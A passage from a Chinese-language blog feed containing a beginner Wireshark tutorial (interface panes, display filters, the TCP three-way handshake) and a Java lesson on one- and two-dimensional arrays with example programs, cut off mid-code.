        <content type="html"><![CDATA[<p>&ensp;<br>&ensp;</p><center><font color="#00B2EE" face="Comic sans MS" size="5">Wireshark-Acquaintance</font></center><p>&emsp;<br>&emsp;</p><h3 id="前言"><font color="#3CB371" face="Comic sans MS">前言</font><a href="post/Wireshark-1#前言"></a></h3><p><font face="Comic sans MS">Wireshark是一款世界范围最广、最好用的网络封包分析软件，功能强大，界面友好直观，操作起来非常方便。它的创始人是Gerald Combs，前身是Ethereal，作为开源项目经过众多开发者的完善它已经成为使用量最大的安全工具之一。在CTF中也经常会使用wireshark进行流量数据包分析，可以快速检测网络通讯数据，获取最为详细的网络封包资料。Wireshark使用WinPCAP作为接口，直接与网卡进行数据报文交换。用户将在图形界面中浏览这些数据，实时监控TCP、session等网络动态，轻松完成网络管理工作。<br></font></p><h3 id="什么是数据包分析"><font color="#3CB371" face="Comic sans MS">什么是数据包分析</font><a href="post/Wireshark-1#什么是数据包分析"></a></h3><p><font face="Comic sans MS">数据包嗅探或协议分析:指捕获和解析网络上传输的数据的过程，以便更好地了解网络上正在发生的事情。<br></font></p><h3 id="TCP-IP四层模型："><font color="#3CB371" face="Comic sans MS">TCP/IP四层模型：</font><a href="post/Wireshark-1#TCP-IP四层模型："></a></h3><p><font face="Comic sans MS"><strong>1.应用层：</strong>最高的一层，直接面对用户，各种程序都是基于这一层，主要作用是处理传输层提交的信息，与用户交换，并把信息传到下层发送。<br><strong>2.传输层：</strong>主要作用对数据包的分割、重组、连接、管理、排序、重传等等，以及标记逻辑端口号—常见协议：TCP、UDP; 端口0~ 65535个端口，只是应该标识，方便管理（such as:21端口是FTP程序，80端口是HTTP程序，4000端口是QQ）。<br><strong>3.网络层：</strong>主要作用是实现与远程设备的连接，是TCP/IP模型中最重要的一层，封装为 IP头部。封装中的重要部分为IP地址，每台设备唯一。<br><strong>4.链路层：</strong>主要功能在两个网络实体之间提供数据链路链接，最常见的是以太网和IEEE 802封装，封装中有一个重要的部分就是MAC地址（网卡物理地址）。<br></font></p><div class="article-img"><p><img src="https://i.loli.net/2019/01/19/5c42f9967e0d9.png" alt="19-2.png" data-zoomable></p></div><p><font face="Comic sans MS"><strong>TCP协议：</strong>可靠，面向连接，效验数据，超时重传，有序号，保证数据完整有序到达，但是协议复杂速度稍慢。（适合文件传输和网页浏览，对数据完整有序要求比较高的场合）<br><strong>UDP协议:</strong>不可靠，仅发送数据，不保证数据完整有序到达，协议简单速度快。（适合DNS查询，视频聊天，对数据完整有序要求比较低，但对数据即使性要求比较高的场合）<br></font></p><h3 id="wireshark界面介绍"><font color="#3CB371" face="Comic sans MS">wireshark界面介绍</font><a href="post/Wireshark-1#wireshark界面介绍"></a></h3><p><font face="Comic sans MS">wireshark是捕获机器上的某一块网卡的网络包，当你的机器上有多块网卡的时候，你需要选择一个网卡。 点击 <code>Caputre-&gt;Interfaces</code>. 出现下面对话框，选择正确的网卡。然后点击<code>Start</code>按钮, 开始抓包</font></p><p><strong>WireShark 主要分为这几个界面</strong></p><ol><li>Display Filter(显示过滤器)，用于过滤。</li><li>Packet List Pane(封包列表)，显示捕获到的封包，有源地址和目标地址，端口号。 颜色不同，代表</li><li>Packet Details Pane(封包详细信息)，显示封包中的字段。</li><li>Dissector Pane(16进制数据)。</li><li>Miscellanous(地址栏，杂项)。</li></ol><div class="article-img"><p><img src="https://i.loli.net/2019/01/19/5c42fc67a674b.png" alt="19-3.png" data-zoomable></p></div><p>&emsp;<br>&emsp;</p><h4 id="1-Display-Filter-显示过滤器"><font color="red" face="Comic sans MS"><strong>1. Display Filter(显示过滤器)</strong></font><a href="post/Wireshark-1#1-Display-Filter-显示过滤器"></a></h4><div class="article-img"><p><img src="https://i.loli.net/2019/01/19/5c4300457e402.png" alt="19-4.png" data-zoomable></p></div><p><font face="Comic sans MS">使用过滤是非常重要的， 初学者使用wireshark时，将会得到大量的冗余信息，在几千甚至几万条记录中，以至于很难找到自己需要的部分。搞得晕头转向。<br>过滤器会帮助我们在大量的数据中迅速找到我们需要的信息。<br>过滤器有两种:<br>&emsp;&emsp;&emsp;一种是显示过滤器，就是主界面上那个，用来在捕获的记录中找到所需要的记录<br>&emsp;&emsp;&emsp;一种是捕获过滤器，用来过滤捕获的封包，以免捕获太多的记录。<br>在<code>Capture-&gt;Capture Filters</code>中设置.</font></p><p>&emsp;<br><strong>保存过滤</strong><br>在Filter栏上，填好Filter的表达式后，点击 + 按钮，取个名字。比如 “test”。点击OK后Filter栏上就多了个”test” 的按钮。</p><div class="article-img"><p><img src="https://i.loli.net/2019/01/19/5c4302ec99520.png" alt="19-5.png" data-zoomable></p></div><p>&emsp;<br><font face="Comic sans MS"><strong>过滤表达式的规则</strong><br>表达式规则<br>&emsp;&emsp;1. 协议过滤 比如TCP，只显示TCP协议。<br>&emsp;&emsp;2. IP 过滤 比如 ip.src ==192.168.1.102显示源地址为192.168.1.102，ip.dst==192.168.1.102, 目标地址为192.168.1.102<br>&emsp;&emsp;3. 端口过滤 tcp.port ==80, 端口为80的 tcp.srcport == 80, 只显示TCP协议的愿端口为80的。<br>&emsp;&emsp;4. Http模式过滤 http.request.method==”GET”, 只显示HTTP GET方法的。<br>&emsp;&emsp;5. 逻辑运算符为 AND/ OR 常用的过滤表达式<br></font></p><pre class="line-numbers language-bash"><code class="language-bash">过滤表达式                                                      用途http                                                    只查看HTTP协议的记录ip.src<span class="token operator">==</span>192.168.1.102 or ip.dst<span class="token operator">==</span>192.168.1.102      源地址或者目标地址是192.168.1.102<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="2-封包列表-Packet-List-Pane"><font color="red" face="Comic sans MS"><strong>2. 封包列表(Packet List Pane)</strong></font><a href="post/Wireshark-1#2-封包列表-Packet-List-Pane"></a></h4><p><font face="Comic sans MS">封包列表的面板中显示，编号，时间戳，源地址，目标地址，协议，长度，以及封包信息。 <font color="#00B2EE"><strong>你可以看到不同的协议用了不同的颜色显示。</strong></font><br>你也可以修改这些显示颜色的规则，<code>View-&gt;ColoringRules</code>。</font></p><div class="article-img"><p><img src="https://i.loli.net/2019/01/19/5c4308567081a.png" alt="19-6.png" data-zoomable></p></div><p>&emsp;<br>&emsp;</p><h4 id="3-Packet-Details-Pane-封包详细信息"><font color="red" face="Comic sans MS"><strong>3. Packet Details Pane(封包详细信息)</strong></font><a href="post/Wireshark-1#3-Packet-Details-Pane-封包详细信息"></a></h4><p><font face="Comic sans MS">Packet Details Pane(封包详细信息)，这个面板是我们最重要的，用来查看协议中的每一个字段。<br><strong>各行信息分别为：</strong><br>Frame: 物理层的数据帧概况<br>Ethernet II: 数据链路层以太网帧头部信息<br>Internet Protocol Version 4: 互联网层IP包头部信息<br>Transmission Control Protocol: 传输层T的数据段头部信息，此处是TCP<br>Hypertext Transfer Protocol: 应用层的信息，此处是HTTP协议</font></p><div class="article-img"><p><img src="https://i.loli.net/2019/01/19/5c43110cce481.png" alt="19-7.png" data-zoomable></p></div><p><font face="Comic sans MS"><strong>TCP包的具体内容</strong><br>从下图可以看到wireshark捕获到的TCP包中的每个字段。</font></p><div class="article-img"><p><img src="https://i.loli.net/2019/01/19/5c4311b3be837.png" alt="19-8.png" data-zoomable></p></div><p>&emsp;<br><font face="Comic sans MS"><strong>TCP三次握手</strong><br>看到这， 基本上对wireshak有了初步了解， 现在我们看一个TCP三次握手的实例三次握手过程为：</font></p><div class="article-img"><p><img src="https://i.loli.net/2019/01/19/5c4312139aa7f.png" alt="19-9.png" data-zoomable></p></div><p><font face="Comic sans MS">我们用wireshark实际分析下三次握手的过程。 打开wireshark, 打开浏览器输入 <a href="http://www.cr173.com" target="_blank" rel="noopener">http://www.cr173.com</a> 在wireshark中输入http过滤， 然后选中GET /tankxiao HTTP/1.1的那条记录，右键然后点击”Follow TCP Stream”, 这样做的目的是为了得到与浏览器打开网站相关的数据包，将得到如下图：</font></p><div class="article-img"><p><img src="https://i.loli.net/2019/01/19/5c431281371cc.png" alt="19-10.png" data-zoomable></p></div><p><font face="Comic sans MS">图中可以看到wireshark截获到了三次握手的三个数据包。第四个包才是HTTP的， 这说明HTTP的确是使用TCP建立连接的。</font></p><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>第一次握手数据包</strong></font><br>客户端发送一个TCP，标志位为SYN，序列号为0， 代表客户端请求建立连接。 如下图</font></p><div class="article-img"><p><img src="https://i.loli.net/2019/01/19/5c4313be5c1f4.png" alt="19-11.png" data-zoomable></p></div><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>第二次握手的数据包</strong></font><br>服务器发回确认包, 标志位为 SYN,ACK. 将确认序号(Acknowledgement Number)设置为客户的SYN加1以.即0+1=1, 如下</font></p><div class="article-img"><p><img src="https://i.loli.net/2019/01/19/5c4314b91bc6b.png" alt="19-12.png" data-zoomable></p></div><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>第三次握手的数据包</strong></font><br>客户端再次发送确认包(ACK) SYN标志位为0,ACK标志位为1.并且把服务器发来ACK的序号字段+1,放在确定字段中发送给对方.并且在数据段放写ISN的+1, 如下图</font></p><div class="article-img"><p><img src="https://i.loli.net/2019/01/19/5c4315188f16a.png" alt="19-13.png" data-zoomable></p></div><p>&emsp;<br>就这样通过了TCP三次握手，建立了连接。  <a href="https://mp.weixin.qq.com/s/qjLNOopwvWlJOWW6SAcTig" target="_blank" rel="noopener">参考文章</a></p><hr><hr>]]></content>
      
      
      <categories>
          
          <category> Web-Tools </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> Wireshark </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java数组(3.9)</title>
      <link href="/post/Java-Language-2-4/"/>
      <url>/post/Java-Language-2-4/</url>
      
        <content type="html"><![CDATA[<p>&ensp;<br>&ensp;</p><center><font color="#3CB371" face="Comic sans MS" size="5">数组</font></center><p>&emsp;<br>&emsp;</p><h3 id="一、-一维数组"><font color="#FF6347" face="Comic sans MS">一、 一维数组 </font><a href="post/Java-Language-2-4#一、-一维数组"></a></h3><p><font face="Comic sans MS"><font color="red"> <strong>数组：</strong> </font><font color="#00B2EE"><strong>相同类型的数据元素按顺序组成的一种线性表</strong></font>，元素在数组中的相对位置由下标来指定。数组中的每个元素通过数组名加下标进行引用。</font></p><p><font color="red"> <strong>数组有什么用处？</strong> </font><br><font color="#009ACD"><em>例：定义100个int型变量，求这100个变量的和。</em></font><br>int x1,x2,x3…x100;<br>int sum;<br>sum=x1+x2+…+x100;<br>这样程序很复杂。<br><font color="#009ACD"><em>例：定义100个int型变量，求这100个变量的和。</em></font><br>有了数组后，可以这样编程：<br>int [] x=new int[100];<br>int sum=0;<br>for(int i=0;i&lt;100;i++)<br>{<br>     sum=sum+x[i];<br>}<br>这样使得程序编写方便很多。</p><p><font color="red"> <strong>注意：</strong> </font><br>Java中，数组是独立的<font color="#00B2EE"><strong>类</strong></font>，有自身的方法，<font color="#00B2EE"><strong>不只是变量的集合</strong></font>。在Java里创建一个数组，需要做如下的工作：<br>   （1）说明一个变量来存放该数组。<br>   （2）<font color="#00B2EE"><strong>建立一个新的数组对象</strong></font>（即创建数组空间）并把它赋给这个数组变量。<br>   （3）在该数组中存储信息。<br></p><p>&emsp;&emsp;<font color="red"> <strong>↓↓</strong> </font></p><blockquote><p>例如：String list[ ]=new String[3];<br>             list[0]=“one”;<br>             list[1]=“two”;</p></blockquote><p>&emsp;<br>&emsp;</p><h4 id="1-1-一维数组的说明"><font color="#3CB371" face="Comic sans MS">1.1  一维数组的说明</font><a href="post/Java-Language-2-4#1-1-一维数组的说明"></a></h4><p><font face="Comic sans MS">同其他类变量一样，在使用数组前必须先说明它，一维数组说明的格式如下：<br><font color="red">&emsp;       类型    数组名[ ]；<br>    或 类型[ ]    数组名；<br></font></font></p><blockquote><p>例如：int list[ ];<br>            int[] list;<br>            String[] args;<br>            String args[];</p></blockquote><p>&emsp;<br>&emsp;</p><h4 id="1-2-创建数组空间"><font color="#3CB371" face="Comic sans MS">1.2  创建数组空间</font><a href="post/Java-Language-2-4#1-2-创建数组空间"></a></h4><p><font face="Comic sans MS">创建数组空间必须声明数组的长度，以确定所开辟的内存空间的大小，在Java中实际上就是通过new创建一个新的数组对象并把它赋给这个数组变量。其语法格式如下：<br><font color="red">&emsp;&emsp;&emsp;数组名=new 数组元素类型[数组元素个数]</font><br>例如：int[] list;   list=new int[3];</font></p><p>数组的说明和构造合并在一起，其语法格式如下：<br><font color="red">&emsp;&emsp;&emsp;          类型 数组名[ ]=new 数组元素类型[数组元素个数]；]</font><br>例如：int list[ ]=new int[3];<br></p><p>&emsp;<br>&emsp;</p><h4 id="1-3-数组的初始化"><font color="#3CB371" face="Comic sans MS">1.3  数组的初始化</font><a href="post/Java-Language-2-4#1-3-数组的初始化"></a></h4><p><font face="Comic sans MS"><font color="red"><strong>1. 数组的初始化方式有两种：</strong></font><br>(1) 像初始化简单类型一样自动初始化数组，即在说明数组的同时进行初始化；<br>&emsp;&emsp;<font color="red">     int a[]={1,2,3,4}</font><br>(2) 先定义数组，然后为每个元素赋值。例如：<br>&emsp;&emsp;<font color="red">     int b[]=new int[3];</font><br>&emsp;&emsp;<font color="red">     b[0]=8;b[1]=9;</font><br>&emsp;<br><font color="red"><strong>2. 这样初始化也可以!</strong></font><br>另一种形式1：<br><font color="red">int[] a=new int[]{1,2,3,4};</font>&emsp;&emsp; 等价于: int[] a={1,2,3,4}<br>{}中的元素个数决定了[]中的元素个数。{}中的元素取值决定了数组a各个元素的取值。</font></p><p>另一种形式2：<br><font color="red">int[] a;<br>a=new int[]{1,2,3,4};</font><br>等价于：int[] a=new int[3];<br>&emsp;&emsp;&emsp;&emsp; a[0]=1;a[1]=2;a[2]=3;<br>&emsp;&emsp;&emsp;&emsp; a[3]=4<br></p><blockquote><p>但是这样定义是错误的：<br>int[] a;<br>a={1,2,3,4};</p></blockquote><p><font face="Comic sans MS"><font color="red"><strong>定义数组要注意：</strong></font><br>(1) 不能这样定义数组：<br>&emsp;&emsp;&emsp;&emsp;          int a[5];<br>(2)不能这样初始化数组：<br>&emsp;&emsp;&emsp;&emsp;          int[] a;   a={1,2,3,4};<br>(3)使用new 创建数组之后，数组中的每个元素被自动初始化为0。<br>&emsp;&emsp;&emsp;&emsp;         int [] a=new int[10];<br>&emsp;&emsp;&emsp;&emsp;         for(int i=0;i&lt;10;i++)<br>&emsp;&emsp;&emsp;&emsp;           { System.out.println(“a[“+i+”]=”+a[i]);<br>&emsp;&emsp;&emsp;&emsp;           }<br></font></p><p>&emsp;<br>&emsp;</p><h4 id="1-4-数组元素的使用"><font color="#3CB371" face="Comic sans MS">1.4  数组元素的使用</font><a href="post/Java-Language-2-4#1-4-数组元素的使用"></a></h4><p><font face="Comic sans MS">数组元素的表示方式为：<br>&emsp;&emsp;&emsp;&emsp; <font color="red">数组名[下标]</font><br>&emsp;<br><font color="red"><strong>使用数组时要注意：</strong></font><br>（1）数组越界异常:<font color="#00B2EE"><strong>Java在对数组元素操作时会对数组下标进行越界检查，以保证安全性。</strong></font>若在Java程序中超出了对数组下标的使用范围则在运行此程序时将出现如下错误信息：<br>&emsp;&emsp;    <em>Exception in thread “main”             Java.lang.ArrayIndexOutOfBoundsException</em><br>如下的错误即数组越界：int x[]={1,2,3,4};System.out.println(x[4]);</font></p><p>（2）每个数组都有一个属性length来指明其长度，字符串String用length()。<br>&emsp;&emsp;<font color="red">         <strong>list.length;</strong></font></p><p>（3）空指针异常<br></p><pre class="line-numbers language-java"><code class="language-java">数组长度lengh的使用<span class="token keyword">int</span> x<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">;</span>                  <span class="token keyword">int</span> x<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">}</span><span class="token punctuation">;</span><span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span><span class="token number">100</span><span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>              <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>x<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>  System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">{</span> System<span class="token punctuation">.</span>out<span class="token punctuation">.</span><span class="token function">println</span><span class="token punctuation">(</span>x<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token punctuation">}</span>                                   <span class="token punctuation">}</span>空指针如下使用会导致错误<span class="token keyword">int</span> x<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>x<span class="token operator">=</span>null<span class="token punctuation">;</span>x<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&emsp;<br>&emsp;</p><h4 id="1-5-一维数组使用举例"><font color="#3CB371" face="Comic sans MS">1.5  一维数组使用举例</font><a href="post/Java-Language-2-4#1-5-一维数组使用举例"></a></h4><pre class="line-numbers language-bash"><code class="language-bash"><span class="token punctuation">[</span>例3-12<span class="token punctuation">]</span> 练习数组的创建和使用<span class="token punctuation">[</span>例3-13<span class="token punctuation">]</span> 练习数组越界<span class="token punctuation">[</span>例3-14<span class="token punctuation">]</span> 数组作为函数的参数<span class="token punctuation">[</span>例3-12<span class="token punctuation">]</span> HalfDollars.java 练习数组的创建与使用class HalfDollars<span class="token punctuation">{</span>    public static void main<span class="token punctuation">(</span>String<span class="token punctuation">[</span><span class="token punctuation">]</span> args<span class="token punctuation">)</span><span class="token punctuation">{</span>        int<span class="token punctuation">[</span><span class="token punctuation">]</span> denver<span class="token operator">=</span><span class="token punctuation">{</span>15000006,18810000,20752110<span class="token punctuation">}</span><span class="token punctuation">;</span>        int<span class="token punctuation">[</span><span class="token punctuation">]</span> philadelphia<span class="token operator">=</span>new int<span class="token punctuation">[</span>denver.length<span class="token punctuation">]</span><span class="token punctuation">;</span>        int<span class="token punctuation">[</span><span class="token punctuation">]</span> total<span class="token operator">=</span>new int<span class="token punctuation">[</span>denver.length<span class="token punctuation">]</span><span class="token punctuation">;</span>        int average<span class="token punctuation">;</span>        philadelphia<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span>15020000<span class="token punctuation">;</span>        philadelphia<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">=</span>18709000<span class="token punctuation">;</span>        philadelphia<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token operator">=</span>21348000<span class="token punctuation">;</span>        total<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span>denver<span class="token punctuation">[</span>0<span class="token punctuation">]</span>+philadelphia<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">;</span>        total<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">=</span>denver<span class="token punctuation">[</span>1<span class="token punctuation">]</span>+philadelphia<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">;</span>        total<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token operator">=</span>denver<span class="token punctuation">[</span>2<span class="token punctuation">]</span>+philadelphia<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">;</span>        average<span class="token operator">=</span><span class="token punctuation">(</span>total<span class="token punctuation">[</span>0<span class="token punctuation">]</span>+total<span class="token punctuation">[</span>1<span class="token punctuation">]</span>+total<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">)</span>/3<span class="token punctuation">;</span>        System.out.println<span class="token punctuation">(</span><span class="token string">"1993 production:"</span>+total<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System.out.println<span class="token punctuation">(</span><span class="token string">"1994 production:"</span>+total<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System.out.println<span class="token punctuation">(</span><span class="token string">"1995 production:"</span>+total<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        System.out.println<span class="token punctuation">(</span><span class="token string">"Average production:"</span>+average<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token punctuation">}</span><span class="token punctuation">}</span>运行结果：1993 production:300200061994 production:375190001995 production:42100110Average production:36546372<span class="token punctuation">[</span>例3-13<span class="token punctuation">]</span> ChoiceSort.java 数组的越界public class ChoiceSort<span class="token punctuation">{</span>    public static void main<span class="token punctuation">(</span>String arg<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>     <span class="token punctuation">{</span>   int i,min<span class="token punctuation">;</span>          int str<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span>2,13,41,58,32<span class="token punctuation">}</span><span class="token punctuation">;</span>          for<span class="token punctuation">(</span>i<span class="token operator">=</span>0<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>5<span class="token punctuation">;</span>i++<span class="token punctuation">)</span>          <span class="token punctuation">{</span>             min<span class="token operator">=</span>i<span class="token punctuation">;</span>            for<span class="token punctuation">(</span>int j<span class="token operator">=</span>i+1<span class="token punctuation">;</span>j<span class="token operator">&lt;</span>6<span class="token punctuation">;</span>j++<span class="token punctuation">)</span>             <span class="token punctuation">{</span>                     if<span class="token punctuation">(</span>str<span class="token punctuation">[</span>min<span class="token punctuation">]</span><span class="token operator">></span>str<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>                  <span class="token punctuation">{</span>                  int at<span class="token operator">=</span>str<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>                  str<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token operator">=</span>str<span class="token punctuation">[</span>min<span class="token punctuation">]</span><span class="token punctuation">;</span>                  str<span class="token punctuation">[</span>min<span class="token punctuation">]</span><span class="token operator">=</span>at<span class="token punctuation">;</span>                 <span class="token punctuation">}</span>             <span class="token punctuation">}</span>            <span class="token punctuation">}</span>        for<span class="token punctuation">(</span>i<span class="token operator">=</span>0<span class="token punctuation">;</span>i<span class="token operator">&lt;</span>5<span class="token punctuation">;</span>i++<span class="token punctuation">)</span>        System.out.println<span class="token punctuation">(</span>str<span class="token punctuation">[</span>i<span class="token punctuation">]</span>+<span class="token string">" "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>运行结果：程序没能正常运行，抛出了“java.lang.ArrayIndexOutOfBoundsException”异常。 例<span class="token punctuation">[</span>3-14<span class="token punctuation">]</span> test.java 数组作为函数的参数class <span class="token function">test</span>  <span class="token punctuation">{</span>   static void change<span class="token punctuation">(</span>int <span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token punctuation">)</span>  //输出a<span class="token punctuation">[</span>0<span class="token punctuation">]</span>和a<span class="token punctuation">[</span>1<span class="token punctuation">]</span>中大的那个数    <span class="token punctuation">{</span>    int t<span class="token punctuation">;</span>         if<span class="token punctuation">(</span>a<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">&lt;</span>a<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">)</span>         <span class="token punctuation">{</span>        t<span class="token operator">=</span>a<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">;</span>                  a<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span>a<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">;</span>                  a<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">=</span>t<span class="token punctuation">;</span>         <span class="token punctuation">}</span>         System.out.println<span class="token punctuation">(</span>a<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    public static void main<span class="token punctuation">(</span>String args<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>   <span class="token punctuation">{</span>    int x<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span>5,12<span class="token punctuation">}</span><span class="token punctuation">;</span>        change<span class="token punctuation">(</span>x<span class="token punctuation">)</span><span class="token punctuation">;</span>     //调用过后，数组x可能发生变化   <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><hr><p>&emsp;<br>&emsp;</p><h3 id="二、-二维数组"><font color="#FF6347" face="Comic sans MS">二、 二维数组 </font><a href="post/Java-Language-2-4#二、-二维数组"></a></h3><p><font face="Comic sans MS">Java中的多维数组实际上是数组的数组。不一定是规则的矩阵数组。<br><font color="red">多维数组：数组的数组，例如，二维数组为一个特殊的一维数组，其每个元素又是一个一维数组<br></font></font></p><div class="article-img"><p><img src="https://i.loli.net/2019/01/13/5c3ad27f549bb.png" alt="1.png" data-zoomable><img src="https://i.loli.net/2019/01/13/5c3ad282ed579.png" alt="2.png" data-zoomable></p></div><p>&emsp;<br>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>二维数组说明的格式为：</strong></font><br><font color="red">&emsp;  类型    数组名[ ][ ]；<br>      或                  类型[ ][ ]     数组名；<br></font><br>例如，说明一个整型的二维数组如下：<br><font color="red">&emsp;    int intArray[ ][ ];或 int[ ][ ] intArray;<br></font></font></p><p>&emsp;<br><font color="#00B2EE"><strong>二维数组的创建：</strong></font><br>直接为每一维分配空间，如：<br><font color="red">&emsp;       int a[ ][ ]=new int[2][3];</font><br></p><p>|||<br>:-: | :-: | :-:<br>a[0][0]|a[0][1]|a[0][2]<br>a[1][0]|a[1][1]|a[1][2]</p><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>从最高维开始，分别为每一维分配空间，如：</strong></font><br>int b[ ][ ]=new int[2][ ];<br>b[0]=new int[3];<br>b[1]=new int[5];<br></font></p><div class="article-bounded"><div class="article-table"><table><tbody><tr><td align="center">b[0][0]</td><td align="center">b[0][1]</td><td align="center">b[0][2]</td></tr><tr><td align="center">b[1][0]</td><td align="center">b[1][1]</td><td align="center">b[1][2]</td></tr></tbody></table></div></div><p>&emsp;<br><font face="Comic sans MS"><font color="#00B2EE"><strong>元素的初始化：</strong></font><br>（1）直接对每个元素进行赋值。<br>（2）在说明数组的同时进行初始化。<br></font></p><pre class="line-numbers language-bash"><code class="language-bash">例如：  int<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token punctuation">]</span> a<span class="token operator">=</span>new int<span class="token punctuation">[</span>3<span class="token punctuation">]</span><span class="token punctuation">[</span>2<span class="token punctuation">]</span>：              a<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span>2； a<span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">=</span>3              a<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span>1； a<span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">=</span>5              a<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">[</span>0<span class="token punctuation">]</span><span class="token operator">=</span>3； a<span class="token punctuation">[</span>2<span class="token punctuation">]</span><span class="token punctuation">[</span>1<span class="token punctuation">]</span><span class="token operator">=</span>4  等价于：int a<span class="token punctuation">[</span> <span class="token punctuation">]</span><span class="token punctuation">[</span> <span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">{</span><span class="token punctuation">{</span>2,3<span class="token punctuation">}</span>,<span class="token punctuation">{</span>1,5<span class="token punctuation">}</span>,<span class="token punctuation">{</span>3,4<span class="token punctuation">}</span><span class="token 